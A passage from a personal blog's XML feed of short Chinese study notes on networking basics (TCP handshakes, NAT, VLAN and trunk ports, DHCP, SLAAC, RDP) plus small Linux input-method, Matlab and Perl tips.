    <link href="/2022/10/30/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99-Framer-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/30/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99-Framer-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Vedio-Tutorial"><a href="#Vedio-Tutorial" class="headerlink" title="Vedio Tutorial"></a>Vedio Tutorial</h1><h2 id="App-Tutorial"><a href="#App-Tutorial" class="headerlink" title="App Tutorial"></a>App Tutorial</h2><p>利用 Publish 可以预览.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP-和-UDP-协议</title>
    <link href="/2022/10/30/TCP-%E5%92%8C-UDP-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/10/30/TCP-%E5%92%8C-UDP-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1kV411j7hA/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考</a></p><h1 id="TCP-协议"><a href="#TCP-协议" class="headerlink" title="TCP 协议"></a>TCP 协议</h1><h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>SYN 包, Synchronise, 可视为请求同步.</p><p>对端同意连接回复的 SYN+ACK 包, ACK 可视为 Acknowledge (有告知收到的意思).</p><p>最后 Client 端回复的 ACK 包也是告知收到.</p><p>由于在建立连接的过程中相互之间发送了三个数据包, 于是称三次握手.</p><p>三次握手是为了解决网络信道不可靠的问题.</p><p>若 Server 端未收到最后的 ACK 包, 也就不会建立连接.</p><p><img src="/../img/three_handshake.png"></p><h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p><img src="/../img/four_hand_wave.png"></p><h2 id="丢包问题和乱序问题"><a href="#丢包问题和乱序问题" class="headerlink" title="丢包问题和乱序问题"></a>丢包问题和乱序问题</h2><p>建立发送缓冲区解决.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是拓扑</title>
    <link href="/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF%E6%8B%93%E6%89%91/"/>
    <url>/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF%E6%8B%93%E6%89%91/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://baike.baidu.com/item/%E6%8B%93%E6%89%91/573536">参考</a></h1><p>拓扑这个词并不是中文中的原有词汇, 而是从 Topology 直接音译而来.</p><p>拓扑指, 几何图形或空间在连续改变形状后某些性质任保持不变.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-NAT-的优缺点</title>
    <link href="/2022/10/30/%E5%85%B3%E4%BA%8E-NAT-%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <url>/2022/10/30/%E5%85%B3%E4%BA%8E-NAT-%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://blog.csdn.net/weixin_29086203/article/details/112819041">参考1</a></h1><p>优点:<br>内部主机共享一个共有 IP 地址, 节省了地址.</p><p>保证了网络安全.</p><p>缺点:<br>影响性能. 转换 IP 地址需要时间.</p><p>一些安全应用程序会因为源 IP 地址改变而失败.</p><p>增加 IP 追踪的难度.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>同一个交换机上的不同-VLAN-之间通信</title>
    <link href="/2022/10/30/%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C-VLAN-%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/"/>
    <url>/2022/10/30/%E5%90%8C%E4%B8%80%E4%B8%AA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8A%E7%9A%84%E4%B8%8D%E5%90%8C-VLAN-%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.zylxyl.com/archives/2020/09/07/1068.html">参考</a></p><p>不同的 VLAN 就是不同的网段.</p><p>同一个 VLAN 中的设备可以通过数据链路层通信 (用 MAC 地址来定位).</p><p>不同 VLAN 之间的设备通信需要建立在网络层的基础上 (通过 IP 定位)</p><p>通过单臂路由 (路由器只使用一个端口连接到交换网络中, 可能由于只有一条线, 所以才称为单臂)<br><img src="/../img/single_arm_route.png"></p><p>大致流程 (直接摘录):</p><blockquote><p>当 VLAN10 中的主机 A 向 VLAN20 中的主机 B 发送信息时，交换机端口 1 收到主机 A 发出的数据帧，查询自己的 MAC 地址表，然后将数据帧从 Trunk 端口 4 转发出去，并为数据帧添加 VLAN ID&#x3D;10 的标签。路由器收到数据帧后，发现它属于 VLAN10，因此把它交给负责VLAN10 的子接口，该接口判断数据帧应发往负责 VLAN20 的子接口。负责 VLAN20 的子接口再为数据帧添加 VLAN ID&#x3D;20 的标签并发回给交换机。交换机收到该数据后查询 MAC 地址表，去掉数据帧中的 VLAN 标签，将它从端口 2 发送给主机 B。这样主机 B 就接收到了主机A发给它的信息。可以看到，通过路由器进行VLAN之间的通信时，信息传输经过以下过程：发送者 -&gt; 交换机 -&gt; 路由器 -&gt; 交换机 -&gt; 接收者，即使通信的双方处在同一台交换机上，也必须经过这样的过程</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>交换机和路由器的区别</title>
    <link href="/2022/10/30/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/10/30/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%92%8C%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://www.bilibili.com/video/BV1fU4y1t7Ju/?spm_id_from=333.788.recommend_more_video.3&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考1</a></h1><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>交换机中有 MAC 地址表, 反映端口和 MAC 地址的关系.<br><img src="/../img/switch_port_mac.png"></p><p>交换机只关心 MAC 地址, 不关系 IP 地址. MAC 地址处于数据链路层. 其位于 OSI 模型的第二层, 因此交换机也被成为二层设备.</p><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>路由器有两种端口:<br><img src="/../img/router_port_function.png"></p><p>若忽略路由器的 WAN 口, 路由器就是一个交换机.</p><p>LAN 口接内网, WLAN 口接互联网.<br><img src="/../img/router_two_ports.png"></p><p>TCP&#x2F;IP 协议规定, 不同子网之间不能直接通信, 需要借助网关.</p><p><img src="/../img/router_gateway.png"></p><p>此时, 路由器充当网关的角色.</p><p>路由器上有两张网卡, 一张有分配内网 IP, 用于和内网设备沟通, 一张分配公网 IP, 和互联网沟通.</p><p><img src="/../img/two_cards_on_router.png"></p><p>关于 snat:<br><img src="/../img/about_snat.png"></p><p>在数据包进入互联网时, 将源 IP (内网 IP) 转换为路由器的公网 IP.</p><p>在数据包回传时, 将目标 IP (路由器的公网 IP) 转换为内网计算机的内网 IP.</p><p>同时修改源 IP 和源端口来定位数据包从哪里发出:<br><img src="/../img/back_data.png"></p><p>无端口信息的传输协议用其他标记关联:<br><img src="/../img/other_flag_to_connect.png"></p><p>DNAT 为修改目的 IP.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VLAN-概念以及-Trunk-口概念</title>
    <link href="/2022/10/30/VLAN-%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A-Trunk-%E5%8F%A3%E6%A6%82%E5%BF%B5/"/>
    <url>/2022/10/30/VLAN-%E6%A6%82%E5%BF%B5%E4%BB%A5%E5%8F%8A-Trunk-%E5%8F%A3%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://cloud.tencent.com/developer/article/1741191">参考1</a></h1><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://www.cnblogs.com/weiyikang/p/4945914.html">参考2</a></h1><p>以太网端口有两种链路类型:</p><ul><li>Access</li><li>Trunk</li></ul><p>Access 类型端口只能允许一个 VLAN 的报文通过, 一般用于连接计算机的端口. (也就是说, 可以接受来自一个 VLAN 的数据)</p><p>Trunk 类型的端口可以允许多个 VLAN 通过. 一般用于交换机之间连接的端口. (也就是说能够接受来自多个 VLAN 的数据).</p><h1 id="参考3"><a href="#参考3" class="headerlink" title="参考3"></a><a href="https://www.bilibili.com/video/BV1wb4y1R7XL/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考3</a></h1><p>为什么要用到 trunk 口 ?</p><p>Access 口只允许来自一个 VLAN 的数据, 而交换机与交换机进行数据交换时, 会有多个 VLAN 的数据在传输 (一个交换机上有多个 VLAN 的口, 比如有三个, 那么将这个交换机的数据都流向另一个, 那么就是三个 VLAN 的数据), 因此需要一个口来接收包含多 VLAN 数据.</p><p>trunk 本意为树干, 可以这样看:<br><img src="/../img/why_trunk.png"></p><p>四个 VLAN 的数据汇合, 就像树枝和树干.</p><p>在数据帧中源 MAC 字段之后插入 tag 用来表示这个数据是来自哪一个 VLAN. VLAN ID 为 12 位数据, 表明共有 4096 个 VLAN 可分配. (为 0~4095, 且 0 和 4095 保留, 用户不能使用)<br><img src="/../img/type_vlan.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>访问一个网址所经历的步骤</title>
    <link href="/2022/10/30/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E6%89%80%E7%BB%8F%E5%8E%86%E7%9A%84%E6%AD%A5%E9%AA%A4/"/>
    <url>/2022/10/30/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E6%89%80%E7%BB%8F%E5%8E%86%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/twt936457991/article/details/89587287">参考1</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-ip-a-输出的解析</title>
    <link href="/2022/10/30/%E5%85%B3%E4%BA%8E-ip-a-%E8%BE%93%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/10/30/%E5%85%B3%E4%BA%8E-ip-a-%E8%BE%93%E5%87%BA%E7%9A%84%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://halysl.github.io/2020/01/10/ip-%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90/">参考1</a></h1><p><code>ip a</code> 是 <code>ip addr</code> 的简写.</p><p>内容:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BROADCAST </span>  该接口支持广播<br><span class="hljs-keyword">MULTICAST </span>  该接口支持多播<br>UP          网络接口已启用<br>LOWER_UP    网络电缆已插入，设备已连接至网络<br></code></pre></td></tr></table></figure><p>以及:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mtu</span> <span class="hljs-number">1500</span>                                    最大传输单位（数据包大小）为 <span class="hljs-number">1</span>,<span class="hljs-number">500</span> 字节<br><span class="hljs-attribute">qdisc</span> pfifo_fast                            用于数据包排队<br><span class="hljs-attribute">state</span> UP                                    网络接口已启用（重要）<br><span class="hljs-attribute">group</span> default                               接口组<br><span class="hljs-attribute">qlen</span> <span class="hljs-number">1000</span>                                   传输队列长度<br><span class="hljs-attribute">link</span>/ether <span class="hljs-number">00</span>:<span class="hljs-number">1</span>e:<span class="hljs-number">4</span>f:c8:<span class="hljs-number">43</span>:fc                接口的 MAC（硬件）地址<br><span class="hljs-attribute">brd</span> ff:ff:ff:ff:ff:ff                       广播地址<br><span class="hljs-attribute">inet</span> <span class="hljs-number">192.168.0.24</span>/<span class="hljs-number">24</span>                        IPv4 地址（重要）<br><span class="hljs-attribute">brd</span> <span class="hljs-number">192.168.0.255</span>                           广播地址<br><span class="hljs-attribute">scope</span> global                                全局有效<br><span class="hljs-attribute">dynamic</span> enp0s25                             地址是动态分配的（重要）<br><span class="hljs-attribute">valid_lft</span> <span class="hljs-number">80866</span>sec                          IPv4 地址的有效使用期限<br><span class="hljs-attribute">preferred_lft</span> <span class="hljs-number">80866</span>sec                      IPv4 地址的首选生存期<br><span class="hljs-attribute">inet6</span> fe80::<span class="hljs-number">2</span>c8e:<span class="hljs-number">1</span>de0:a862:<span class="hljs-number">14</span>fd/<span class="hljs-number">64</span>          IPv6 地址<br><span class="hljs-attribute">scope</span> link                                  仅在此设备上有效<br><span class="hljs-attribute">valid_lft</span> forever                           IPv6 地址的有效使用期限<br><span class="hljs-attribute">preferred_lft</span> forever                       IPv6 地址的首选生存期<br></code></pre></td></tr></table></figure><p>查看 <code>man ip-address</code> 还有部分信息.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Unicast,Multicast,Anycast,Broadcast-的内容和用途</title>
    <link href="/2022/10/30/Unicast,Multicast,Anycast,Broadcast-%E7%9A%84%E5%86%85%E5%AE%B9%E5%92%8C%E7%94%A8%E9%80%94/"/>
    <url>/2022/10/30/Unicast,Multicast,Anycast,Broadcast-%E7%9A%84%E5%86%85%E5%AE%B9%E5%92%8C%E7%94%A8%E9%80%94/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://colobu.com/2014/10/21/udp-and-unicast-multicast-broadcast-anycast/">参考1</a></h1><p>Unicast 即单播. 目的地址为单一目标. 通常使用的网络协议或服务大多采用单播传输, 如 TCP.</p><p>Multicast 即多播. 信息传递给多个地址. 较高效.</p><p>Anycast 即任播. 由路由决定送到 “最近” 或 “最好” 的目的地.</p><p>Broadcast 即广播. 目的地址为物理链路中的所有设备.</p><p>使用 <code>ifconfig</code> 命令, 其会有 <code>UP BROADCAST RUNNING MULTICAST</code> 等信息.</p><h2 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h2><p>官方分配的为永久组播组. 其 IP 不变, 内部的成员可以改变.</p><h2 id="广播地址"><a href="#广播地址" class="headerlink" title="广播地址"></a>广播地址</h2><p>Broadcast Address, 在使用 TCP&#x2F;IP 协议的网络中, 主机标识段 host ID 全为 1 的 IP 地址为广播地址. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-link-local-地址</title>
    <link href="/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF-link-local-%E5%9C%B0%E5%9D%80/"/>
    <url>/2022/10/30/%E4%BB%80%E4%B9%88%E6%98%AF-link-local-%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/%E9%93%BE%E8%B7%AF%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80/22828281">参考</a></p><p>Link-local address 仅供于在网段, 或广播域中的主机相互通信使用.</p><p>IPv4 为 169.254.0.0&#x2F;16</p><p>IPv6 为 fe80::&#x2F;10</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SLAAC-下发-IPv6-的流程</title>
    <link href="/2022/10/30/SLAAC-%E4%B8%8B%E5%8F%91-IPv6-%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/10/30/SLAAC-%E4%B8%8B%E5%8F%91-IPv6-%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://blog.csdn.net/weixin_40228200/article/details/118682784">参考1</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SLAAC 是 Stateless Address Autoconfiguration 的简称.</p><p>IPv6 的动态地址配置主要依赖两个协议, 一个是 DHCPv6, 另一个是 IPv6 Stateless Address Autoconfiguration.</p><p>实际中, 经常将 DHCP Server 配置在路由器上.</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>SLAAC 协议由路由器来通告配置 IPv6 地址所需要的信息.</p><ol><li>支持 IPv6 的网卡启动的时候会发送一条 RS (Router Solicitation) 消息, 源 IP 是网卡的 link-local 地址, 目的 IP 是 <code>ff02::2</code>. <code>ff02::2</code> 是保留组播地址, 用来表示所有的路由器.</li><li>路由器收到 RS 消息后, 回传一条 RA (Router Advertisement), 一般情况下, RA 的源 IP 地址是 Router 的 link-local 地址, 目的地址是 <code>ff02::1</code>. <code>ff02::1</code> 也是保留的组播地址, 用来表示所有主机.</li></ol>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-cpan-下载模块出错</title>
    <link href="/2022/10/30/%E4%BD%BF%E7%94%A8-cpan-%E4%B8%8B%E8%BD%BD%E6%A8%A1%E5%9D%97%E5%87%BA%E9%94%99/"/>
    <url>/2022/10/30/%E4%BD%BF%E7%94%A8-cpan-%E4%B8%8B%E8%BD%BD%E6%A8%A1%E5%9D%97%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>force install</code> 来下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan<br>&gt; force install Module::Name<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DHCP-分配-IPv4-地址的流程</title>
    <link href="/2022/10/30/DHCP-%E5%88%86%E9%85%8D-IPv4-%E5%9C%B0%E5%9D%80%E7%9A%84%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/10/30/DHCP-%E5%88%86%E9%85%8D-IPv4-%E5%9C%B0%E5%9D%80%E7%9A%84%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://blog.csdn.net/qq_62311779/article/details/122750972">参考1</a></h1><p>DHCP 使用 UDP 协议传输.</p><p>主机发送请求到 DHCP 服务器的 67 端口, DHCP 服务器返回应答到请求主机的 68 号端口.</p><p>DHCP Client 用广播发送请求. 其包含 DHCP Client 的 MAC 地址和主机名.</p><p>DHCP Server 从尚未分配的 IP 地址池中挑选一个分配给 DHCP 客户机.</p><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://blog.csdn.net/u012359618/article/details/51872678?ops_request_misc=&request_id=&biz_id=102&utm_term=DHCP&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-51872678.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">参考2</a></h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>DHCP 是 Dynamic Host Configuration Protocol 的简称, 是一个应用层协议.</p><p>当我们将客户主机 ip 地址设置为动态获取方式时, DHCP 服务器就会根据 DHCP 协议给客户端分配 IP.</p><p>用 wireshark 过滤是用 <code>BOOTP</code> 或 <code>DHCP</code>.</p><p>四步:</p><ol><li>Client 发送 DHCP Discover 包</li><li>DHCP Server 接收到 DHCP Discover 包后发送 DHCP Offer 包应答</li><li>Client 接收到 Offer 包后, 发送 DHCP Request 包请求分配 IP </li><li>DHCP Server 发送 ACK 数据包确认</li></ol><p><img src="/../img/DHCP_Client_interact_with_Server.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>test_ssh</title>
    <link href="/2022/10/29/test-ssh/"/>
    <url>/2022/10/29/test-ssh/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RDP-协议</title>
    <link href="/2022/10/29/RDP-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/10/29/RDP-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/songshiMVP1/article/details/46441929">参考</a></p><p>RDP 是 Remote Desktop Protocol 的简称.</p><p>用于 Windows. Linux 端有其他的分支.</p><p>所有的计算都在服务器端进行, 客户端只需要处理网络连接, 接受数据, 界面显示和设备数据输出.</p><p>RDP 会对数据进行加密.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OSI-参考模型</title>
    <link href="/2022/10/29/OSI-%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/"/>
    <url>/2022/10/29/OSI-%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/OSI_module.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-fcitx-在终端下又出现问题</title>
    <link href="/2022/10/29/%E5%85%B3%E4%BA%8E-fcitx-%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E5%8F%88%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98/"/>
    <url>/2022/10/29/%E5%85%B3%E4%BA%8E-fcitx-%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E5%8F%88%E5%87%BA%E7%8E%B0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>有的说在 <code>.xprofile</code> 下添加环境变量, 但对我并不适用, 其为使用登录管理器 (lightdm gdm 等) 时才会读取的文件.</p><p>将环境变量添加到 <code>~/.xinitrc</code> 下即可.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> XMODIFIERS=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br><span class="hljs-built_in">export</span> QT_IM_MODULE=fcitx<br><span class="hljs-built_in">export</span> GTK_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>听群友说, 似乎在某次更新后, 不再读取 <code>~/.pam_environment</code> 下的环境:</p><blockquote><p>pambase 升级后不再读取设置在 ~&#x2F;.pam_environment 的环境变量<br>在 ~&#x2F;.pam_environment 中设置桌面环境用的环境变量的用户请注意，pambase &gt;&#x3D;20221020-1 之后取消了 user_readenv&#x3D;1 参数，不再读取设置在 ~&#x2F;.pam_environment 中的环境变量。可以考虑在 &#x2F;etc&#x2F;environment 设置系统全局的环境变量或者采用其它方案。<br>另请注意 &#x2F;etc&#x2F;environment 的语法格式和 ~&#x2F;.pam_environment 并不相同，不能直接复制文件内容。细节请参阅 <a href="https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BD%BF%E7%94%A8_pam_env">https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BD%BF%E7%94%A8_pam_env</a><br>关于其余设置环境变量的方案也可参考 <a href="https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/Environment_variables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br>fcitx5 相关的环境变量还可参考 <a href="https://wiki.archlinux.org/title/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9B%86%E6%88%90">https://wiki.archlinux.org/title/Fcitx5_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9B%86%E6%88%90</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-技巧积累</title>
    <link href="/2022/10/28/Matlab-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/28/Matlab-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="将图像保存为-PNG"><a href="#将图像保存为-PNG" class="headerlink" title="将图像保存为 PNG"></a>将图像保存为 PNG</h1><p><a href="https://ww2.mathworks.cn/help/matlab/ref/saveas.html?searchHighlight=saveas&s_tid=srchtitle_saveas_1">参考</a></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">saveas(<span class="hljs-name">gcf</span>, &#x27;figure.png&#x27;, &#x27;png&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1 id="指数拟合"><a href="#指数拟合" class="headerlink" title="指数拟合"></a>指数拟合</h1><p>用 <code>cftool</code> 命令.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-添加散点</title>
    <link href="/2022/10/28/Matlab-%E6%B7%BB%E5%8A%A0%E6%95%A3%E7%82%B9/"/>
    <url>/2022/10/28/Matlab-%E6%B7%BB%E5%8A%A0%E6%95%A3%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>scatter</code>, 只在图中添加散点, 并不连接.</p><p>在 <code>plot</code> 中添加 <code>-o</code> 参数即可.<br>如:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>];<br>y = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>];<br>plot(x, y, <span class="hljs-string">&#x27;-o&#x27;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown-技巧积累</title>
    <link href="/2022/10/27/Markdown-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/27/Markdown-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="在表格中换行"><a href="#在表格中换行" class="headerlink" title="在表格中换行"></a>在表格中换行</h1><p>使用 <code>&lt;br&gt;</code> (html 中的标记).</p>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Perl-中-Benchmark-模块</title>
    <link href="/2022/10/27/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD-Benchmark-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/10/27/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD-Benchmark-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>Benchmark 是 Benchmark running times of Perl code. 用来测速. 具体看:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc Benchmark<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-技巧积累</title>
    <link href="/2022/10/27/Perl-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/10/27/Perl-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
